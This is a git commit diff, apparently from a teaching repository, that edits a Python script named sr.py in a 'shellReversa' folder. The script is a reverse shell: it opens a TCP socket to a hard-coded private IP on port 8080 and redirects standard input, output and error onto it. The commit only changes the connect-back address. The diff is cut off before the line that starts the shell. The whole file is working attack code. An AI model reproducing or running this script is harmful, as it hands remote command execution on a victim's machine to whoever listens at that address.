d7d8f574802f5853333f81627f6d1ac219b46d23
Academias IT <31440111+academiasIT@users.noreply.github.com>
2018-11-08 12:59:48 -0300

    Update sr.py

--- shellReversa/sr.py
+++ shellReversa/sr.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("192.168.0.16",8080));
+s.connect(("172.16.34.107",8080));
 os.dup2(s.fileno(),0); 
 os.dup2(s.fileno(),1); 
 os.dup2(s.fileno(),2);
